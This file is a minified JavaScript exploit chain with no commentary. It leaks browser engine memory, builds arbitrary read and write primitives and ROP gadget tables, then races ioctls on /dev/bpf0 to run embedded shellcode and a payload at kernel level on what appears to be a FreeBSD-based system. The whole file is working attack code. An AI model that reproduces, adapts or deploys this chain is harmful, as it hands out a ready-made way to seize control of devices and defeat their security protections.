var payload=[],p,s={},g={},gc={pop_r8:96709,pop_r9:12268047,pop_rax:17397,pop_rcx:339545,pop_rdx:1826852,pop_rsi:586634,pop_rdi:232890,pop_rsp:124551,jmp_rax:130,jmp_rdi:2711166,mov_rdx_rax:3488561,mov_rdi_rax:22692143,mov_rax_rdx:1896224,mov_rbp_rsp:985418,mov__rdi__rax:3857131,mov__rdi__rsi:146114,mov__rax__rsi:2451047,mov_rax__rax__:444474,mov_rax__rdi__:290553,add_rax_rsi:1384646,and_rax_rsi:22481823,add_rdi_rax:5593055,jop:800720,ret:60,stack_chk_fail:200,setjmp:5368},rop=function(){return this.stack=new Uint32Array(65536),this.stackBase=p.read8(p.leakval(this.stack).add32(16)),this.count=0,this.clear=function(){this.count=0,this.runtime=void 0;for(var d=0;2040>d;d++)p.write8(this.stackBase.add32(8*d),0)},this.pushSymbolic=function(){return this.count++,this.count-1},this.finalizeSymbolic=function(d,e){p.write8(this.stackBase.add32(8*d),e)},this.push=function(d){this.finalizeSymbolic(this.pushSymbolic(),d)},this.push_write8=function(d,e){this.push(g.pop_rdi),this.push(d),this.push(g.pop_rsi),this.push(e),this.push(g.mov__rdi__rsi)},this.fcall=function(d,e,h,j,k,l,m){return void 0!=e&&(this.push(g.pop_rdi),this.push(e)),void 0!=h&&(this.push(g.pop_rsi),this.push(h)),void 0!=j&&(this.push(g.pop_rdx),this.push(j)),void 0!=k&&(this.push(g.pop_rcx),this.push(k)),void 0!=l&&(this.push(g.pop_r8),this.push(l)),void 0!=m&&(this.push(g.pop_r9),this.push(m)),this.push(d),this},this.run=function(){var d=p.loadchain(this,this.notimes);return this.clear(),d},this};function makeid(){for(var d="",e="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",h=0;8>h;h++)d+=e.charAt(Math.floor(Math.random()*e.length));return d}for(var instancespr=[],i=0;4096>i;i++)instancespr[i]=new Uint32Array(1),instancespr[i][makeid()]=50057;var _dview;function u2d(d,e){return _dview||(_dview=new DataView(new ArrayBuffer(16))),_dview.setUint32(0,e),_dview.setUint32(4,d),_dview.getFloat64(0)}function zeroFill(d,e){return e-=d.toString().length,0<e?Array(e+(/\./.test(d)?2:1)).join("0")+d:d+""}function int64(d,e){return this.low=d>>>0,this.hi=e>>>0,this.add32=function(h){var j=(4294967295&(this.low>>>0)+h)>>>0,k=this.hi>>>0;return j<this.low&&k++,new int64(j,k)},this.add32inplace=function(h){var j=(4294967295&(this.low>>>0)+h)>>>0,k=this.hi>>>0;j<this.low&&k++,this.hi=k,this.low=j},this.sub32=function(h){var j=(4294967295&(this.low>>>0)-h)>>>0,k=this.hi>>>0;return 4294967295&j>this.low&&k--,new int64(j,k)},this.sub32inplace=function(h){var j=(4294967295&(this.low>>>0)-h)>>>0,k=this.hi>>>0;4294967295&j>this.low&&k--,this.hi=k,this.low=j},this.toString=function(h){h=16;var j=(this.low>>>0).toString(h),k=(this.hi>>>0).toString(h);return 0==this.hi?j:(j=zeroFill(j,8),k+j)},this}var nogc=[],tgt={a:0,b:0,c:0,d:0},y=new ImageData(1,16384);postMessage("","*",[y.data.buffer]);for(var props={},i=0;i<8192;)props[i++]={value:1111638594},props[i++]={value:tgt};for(var foundLeak,foundIndex=0,maxCount=256;foundLeak==void 0&&0<maxCount;){maxCount--,history.pushState(y,""),Object.defineProperties({},props);for(var leak=new Uint32Array(history.state.data.buffer),i=0;i<leak.length-6;i++)if(1111638594==leak[i]&&4294901760==leak[i+1]&&0==leak[i+2]&&0==leak[i+3]&&0==leak[i+4]&&0==leak[i+5]&&14==leak[i+6]&&0==leak[i+7]&&0==leak[i+10]&&0==leak[i+11]&&0==leak[i+12]&&0==leak[i+13]&&14==leak[i+14]&&0==leak[i+15]){foundIndex=i,foundLeak=leak;break}}if(!foundLeak)throw new Error("infoleak fail");Array.prototype.__defineGetter__(100,()=>1);var firstLeak=Array.prototype.slice.call(foundLeak,foundIndex,foundIndex+64),leakJSVal=new int64(firstLeak[8],firstLeak[9]),f=document.body.appendChild(document.createElement("iframe")),a=new f.contentWindow.Array(13.37,13.37),b=new f.contentWindow.Array(u2d(leakJSVal.low+16,leakJSVal.hi),13.37),master=new Uint32Array(4096),slave=new Uint32Array(4096),leakval_u32=new Uint32Array(4096),leakval_helper=[slave,2,3,4,5,6,7,8,9,10];tgt.a=u2d(2048,23077632),tgt.b=0,tgt.c=leakval_helper,tgt.d=4919;var c=Array.prototype.concat.call(a,b);document.body.removeChild(f);var hax=c[0];c[0]=0,tgt.c=c,hax[2]=0,hax[3]=0,Object.defineProperty(Array.prototype,100,{get:void 0}),tgt.c=leakval_helper;var butterfly=new int64(hax[2],hax[3]);butterfly.low+=16,tgt.c=leakval_u32;var lkv_u32_old=new int64(hax[4],hax[5]);hax[4]=butterfly.low,hax[5]=butterfly.hi,tgt.c=master,hax[4]=leakval_u32[0],hax[5]=leakval_u32[1];var a2sb=new int64(master[4],master[5]);tgt.c=leakval_u32,hax[4]=lkv_u32_old.low,hax[5]=lkv_u32_old.hi,tgt.c=0,hax=0,p={write8:function(d,e){master[4]=d.low,master[5]=d.hi,e instanceof int64?(slave[0]=e.low,slave[1]=e.hi):(slave[0]=e,slave[1]=0),master[4]=a2sb.low,master[5]=a2sb.hi},write4:function(d,e){master[4]=d.low,master[5]=d.hi,slave[0]=e,master[4]=a2sb.low,master[5]=a2sb.hi},read8:function(d){master[4]=d.low,master[5]=d.hi;var e=new int64(slave[0],slave[1]);return master[4]=a2sb.low,master[5]=a2sb.hi,e},read4:function(d){master[4]=d.low,master[5]=d.hi;var e=slave[0];return master[4]=a2sb.low,master[5]=a2sb.hi,e},leakval:function(d){leakval_helper[0]=d;var e=this.read8(butterfly);return this.write8(butterfly,new int64(1094795585,4294901760)),e}};var get_jmptgt=function(d){var e=65535&p.read4(d),h=p.read4(d.add32(2));return 9727==e?d.add32(h+6):0},exploit=function(){p.leakfunc=function(qa){var ra=p.leakval(qa);return p.read8(ra.add32(24)).add32(64)};var d=p.leakfunc(parseFloat),e=p.read8(d);e.low&=4294963200,e.sub32inplace(5734400);var h=function(qa){return e.add32(qa)};for(var j in gc)gc.hasOwnProperty(j)&&(g[j]=h(gc[j]));var k=p.read8(get_jmptgt(g.stack_chk_fail));k.low&=4294963200,k.sub32inplace(69632);var l=new Uint8Array(4096),m=p.leakval(l).add32(16);p.write8(m,e),p.write4(m.add32(8),57131008);for(var n,q,r,t;n={a:0,b:0,c:0,d:0},q={a:0,b:0,c:0,d:0},t=p.leakval(q),r=p.leakval(n),r.low-48!=t.low;);[].length=128;var v,w=new Uint32Array(256);nogc.push(w);p.loadchain=function(qa){var ra=0,sa=0,ta=0;v=p.read8(p.leakval(w).add32(16)),p.write8(v.add32(48),g.setjmp),p.write8(v.add32(128),g.jop),p.write8(v,v),p.write8(d,g.jop);var va=p.read8(t),wa=p.read8(t.add32(72));return p.write8(t,v.add32(80)),p.write8(t.add32(72),v),parseFloat(q,q,q,q,q,q),p.write8(t,va),p.write8(t.add32(72),wa),ra=p.read8(v.add32(16)),R=Array.prototype.splice.apply({length:{valueOf:function(){ta=p.read8(ra),sa=p.read8(ra.add32(8));var xa=ra,ya=qa.count;qa.push_write8(ra,ta),qa.push_write8(ra.add32(8),sa),qa.runtime&&(xa=qa.runtime(ra)),qa.push(g.pop_rsp),qa.push(xa),qa.count=ya,p.write8(ra,g.pop_rsp),p.write8(ra.add32(8),qa.stackBase)}}}),p.leakval(R)};var A=new Uint8Array(4096),B=p.leakval(A).add32(16);p.write8(B,k),p.write4(B.add32(8),262144);for(var C,D=0;262144>D;D++)if(114==A[D]&&100==A[D+1]&&108==A[D+2]&&111==A[D+3]&&99==A[D+4]){C=D;break}p.write4(B.add32(8),C+32);for(var E=new Uint32Array(1),F=new Uint8Array(E.buffer),D=0;D<C;D++)if(72==A[D]&&199==A[D+1]&&192==A[D+2]&&73==A[D+7]&&137==A[D+8]&&202==A[D+9]&&15==A[D+10]&&5==A[D+11]){F[0]=A[D+3],F[1]=A[D+4],F[2]=A[D+5],F[3]=A[D+6];var G=E[0];s[G]=k.add32(D)}var H=new rop,I;p.fcall_=function(qa,ra,sa,ta,ua,va,wa){if(H.clear(),H.notimes=this.next_notime,this.next_notime=1,H.fcall(qa,ra,sa,ta,ua,va,wa),H.push(g.pop_rdi),H.push(H.stackBase.add32(16376)),H.push(g.mov__rdi__rax),H.push(g.pop_rax),H.push(p.leakval(1094795842)),1094795842!=H.run().low)throw new Error("unexpected rop behaviour");I=p.read8(H.stackBase.add32(16376))},p.fcall=function(){return p.fcall_.apply(this,arguments),I},p.readstr=function(qa){for(var ra=qa.add32(0),sa=p.read4(ra),ta="";255&sa;)ta+=String.fromCharCode(255&sa),ra.add32inplace(1),sa=p.read4(ra);return ta},p.syscall=function(qa,ra,sa,ta,ua,va,wa){if("number"!=typeof qa)throw new Error("invalid syscall");var xa=s[qa];if(xa==void 0)throw new Error("invalid syscall");return p.fcall(xa,ra,sa,ta,ua,va,wa)},p.sptr=function(qa){for(var ra=new Uint8Array(qa.length+1),sa=0;sa<qa.length;sa++)ra[sa]=255&qa.charCodeAt(sa);return nogc.push(ra),p.read8(p.leakval(ra).add32(16))},p.malloc=function(qa){var ra=new Uint8Array(65536+qa);nogc.push(ra);var sa=p.read8(p.leakval(ra).add32(16));return sa.backing=ra,sa},p.malloc32=function(qa){var ra=new Uint8Array(65536+4*qa);nogc.push(ra);var sa=p.read8(p.leakval(ra).add32(16));return sa.backing=new Uint32Array(ra.buffer),sa};var J=p.syscall(23,0);if("0"!=J){var K=p.syscall(5,p.sptr("/dev/bpf0"),2).low,L=p.syscall(5,p.sptr("/dev/bpf0"),2).low;if(K==4294967295)throw new Error("open bpf fail");var M=p.malloc32(16384),N=p.malloc32(16384),O=M.backing,P=p.malloc(64);p.write8(P,256),p.write8(P.add32(8),M);var Q=p.malloc(64);p.write8(Q,256),p.write8(Q.add32(8),N);for(var D=0;1024>D;)O[D++]=6,O[D++]=0;var R=p.syscall(54,K,2148549243,P);if(0!=R.low)throw new Error("ioctl bpf fail");var S=function(qa,ra){var sa=e.add32(5352),ta=e.add32(7836560),ua=p.malloc32(8192),va=ua.backing;va[0]=1337;var wa=new rop;wa.push(g.ret),wa.push(g.ret),wa.push(g.ret),wa.push(g.ret),ra(wa),p.write8(ua,g.ret),p.write8(ua.add32(16),wa.stackBase),p.syscall(324,1);return nogc.push(ua),nogc.push(wa),function(){p.fcall(ta,sa,ua,p.sptr(qa))}},T,U,V=p.syscall(97,2,2),W=p.malloc32(4096),X=S("GottaGoFast",function(qa){T=qa.stackBase,qa.push(g.ret),qa.push(g.ret),qa.push(g.ret),qa.push(g.pop_rdi),qa.push(K),qa.push(g.pop_rsi),qa.push(2148549243),qa.push(g.pop_rdx),qa.push(P),qa.push(g.pop_rsp),qa.push(qa.stackBase.add32(2048)),qa.count=256;var ra=qa.count;qa.push(s[54]),qa.push_write8(qa.stackBase.add32(8*ra),s[54]),qa.push(g.pop_rdi);var sa=qa.pushSymbolic();qa.push(g.pop_rsi);var ta=qa.pushSymbolic();qa.push(g.mov__rdi__rsi),qa.push(g.pop_rsp),U=qa.stackBase.add32(8*qa.count),qa.push(1094795585),qa.finalizeSymbolic(sa,U),qa.finalizeSymbolic(ta,U.sub32(8))}),Y=new rop,Z=new rop,$=p.malloc32(8192),_=p.malloc32(8192),aa=p.malloc32(8192);p.write8(N.add32(16),$),p.write8($.add32(80),0),p.write8($.add32(104),_);var ba=0;p.write8(_.add32(16),h(19536333)),ba+=96,p.write8($.add32(0),aa),p.write8($.add32(16),aa.add32(8)),p.write8(aa.add32(2e3),h(7271653));for(var ca=aa,D=0;15>D;D++)p.write8(ca,h(19536333)),ba+=96,p.write8(ca.add32(2032),h(7271653)),p.write8(ca.add32(8),ca.add32(32)),p.write8(ca.add32(24),ca.add32(40)),ca=ca.add32(32);var da=ca,ea=ca.add32(8),fa=get_jmptgt(e.add32(248));fa=p.read8(fa),p.write8(da,h(22848539)),ba+=8,p.write8(ea.add32(112),h(19417140)),ba+=8,p.write8(ea.add32(24),ea),p.write8(ea.add32(8),Y.stackBase),p.write8(da.add32(48),g.mov_rbp_rsp),p.write8(ea,da),p.write8(da.add32(1056),h(2566497)),p.write8(da.add32(64),fa.add32(50));var ga=ba+40;p.write8(ea.add32(176),ga);for(var D=0;D<512;D++)p.write8(Y.stackBase.add32(8*D),g.ret);Y.count=16;var ha=function(qa,ra){Y.push(g.pop_rax),Y.push(W),Y.push(g.mov_rax__rax__),Y.push(g.pop_rsi),Y.push(qa),Y.push(g.add_rax_rsi),Y.push(g.pop_rsi),Y.push(ra),Y.push(g.mov__rax__rsi)},ia=function(qa,ra){Y.push(g.pop_rax),Y.push(W),Y.push(g.mov_rax__rax__),Y.push(g.pop_rsi),Y.push(qa),Y.push(g.add_rax_rsi),Y.push(g.mov_rdi_rax),Y.push(g.pop_rax),Y.push(W),Y.push(g.mov_rax__rax__),Y.push(g.pop_rsi),Y.push(ra),Y.push(g.add_rax_rsi),Y.push(g.mov__rdi__rax)};p.write8(W.add32(1056),g.pop_rdi),p.write8(W.add32(64),g.pop_rax),p.write8(W.add32(24),W),Y.push(g.pop_rdi),Y.push(W.add32(24)),Y.push(g.mov_rbp_rsp);var ja=ga-8*Y.count+40;Y.push(h(2566497)),Y.push(g.pop_rax),Y.push(ja),Y.push(g.add_rdi_rax),Y.push(g.mov_rax__rdi__),Y.push(g.pop_rsi),Y.push(762),Y.push(g.add_rax_rsi),Y.push(g.mov__rdi__rax);var ka=p.malloc32(4096);Y.push(g.pop_rdi),Y.push(W),Y.push(g.mov__rdi__rax),Y.push(g.pop_rsi),Y.push(808116),Y.push(g.add_rax_rsi),Y.push(g.pop_rdi),Y.push(W.add32(8)),Y.push(g.mov__rdi__rax),Y.push(g.jmp_rax),Y.push(g.pop_rdi),Y.push(W.add32(16)),Y.push(g.mov__rdi__rax),Y.push(g.pop_rsi),Y.push(new int64(4294901759,4294967295)),Y.push(g.and_rax_rsi),Y.push(g.mov_rdx_rax),Y.push(g.pop_rax),Y.push(W.add32(8)),Y.push(g.mov_rax__rax__),Y.push(g.pop_rsi),Y.push(9),Y.push(g.add_rax_rsi),Y.push(g.mov_rdi_rax),Y.push(g.mov_rax_rdx),Y.push(g.jmp_rdi),Y.push(g.pop_rax),Y.push(W),Y.push(g.mov_rax__rax__),Y.push(g.pop_rsi),Y.push(221338),Y.push(g.add_rax_rsi),Y.push(g.mov_rax__rax__),Y.push(g.pop_rdi),Y.push(W.add32(816)),Y.push(g.mov__rdi__rax),ha(221338,new int64(2425420344,2425393296)),ha(20169540,ka),ha(new int64(4293816070,4294967295),new int64(184,3297329408)),ha(new int64(4293470503,4294967295),new int64(0,1082624841)),ha(new int64(4293470533,4294967295),new int64(2425388523,1922076816)),ha(new int64(4294769332,4294967295),new int64(934690871,826654769)),ha(828366,new int64(233,2336788480)),ha(1329844,new int64(2428747825,2425393296)),ha(new int64(15789236,0),new int64(2,0)),ia(new int64(15789244,0),new int64(4293548276,4294967295)),ha(new int64(15789276,0),new int64(0,1)),Y.push(g.pop_rax),Y.push(W.add32(8)),Y.push(g.mov_rax__rax__),Y.push(g.pop_rsi),Y.push(9),Y.push(g.add_rax_rsi),Y.push(g.mov_rdi_rax),Y.push(g.pop_rax),Y.push(W.add32(16)),Y.push(g.mov_rax__rax__),Y.push(g.jmp_rdi),Y.push(h(380345)),Y.push(W.add32(4096));var la=p.malloc32(16),ma=p.malloc32(256);ma.backing[0]=V,ma.backing[2]=131071,ma.backing[3]=1,ma.backing[4]=5;for(var na=[35817,2425393152,2425393296,2425393296,8567125,2303246336,1096172005,1398030677,2303275535,3149957588,256,551862601,1220806985,9831821,2370371584,4265616532,2370699263,3767542964,2370633744,1585456300,2169045059,1265721540,277432321,4202255,698,3867757568,524479,3607052544,960335176,1207959552,3224487561,2211839809,3698655723,1103114587,1096630620,2428722526,1032669269,4294967160,2303260209,15293925,1207959552,770247,2303262720,3271888842,1818324331,979595116,628633632,1815490864,2648,0,0,0,0,0,0,0,0,0,0,0,0,0,0],D=0;D<na.length;D++)ka.backing[D]=na[D];for(X();;)if(Z.count=0,Z.push(s[362]),Z.push(g.pop_rdi),Z.push(la),Z.push(g.mov__rdi__rax),Z.push(g.ret),Z.push(g.ret),Z.push(g.ret),Z.push(g.ret),Z.push_write8(U,T),Z.push(g.pop_rdi),Z.push(K),Z.push(g.pop_rsi),Z.push(2148549243),Z.push(g.pop_rdx),Z.push(P),Z.push(s[54]),Z.push(g.pop_rax),Z.push(la),Z.push(g.mov_rax__rax__),Z.push(g.mov_rdi_rax),Z.push(g.pop_rsi),Z.push(ma),Z.push(g.pop_rdx),Z.push(1),Z.push(g.pop_rcx),Z.push(0),Z.push(g.pop_r8),Z.push(0),Z.push(s[363]),Z.push(g.pop_rdi),Z.push(L),Z.push(g.pop_rsi),Z.push(2148549243),Z.push(g.pop_rdx),Z.push(Q),Z.push(s[54]),Z.push(g.pop_rax),Z.push(la),Z.push(g.mov_rax__rax__),Z.push(g.mov_rdi_rax),Z.push(s[6]),Z.run(),0!=W.backing[0]){p.syscall(74,ka,16384,7),p.fcall(ka);break}}for(var oa=e.add32(7836560),pa=p.malloc32(16384),D=0;D<payload.length;D++)pa.backing[D]=payload[D];p.syscall(74,pa,65536,7),p.syscall(324,1),p.fcall(oa,pa,0,p.sptr("payload"))};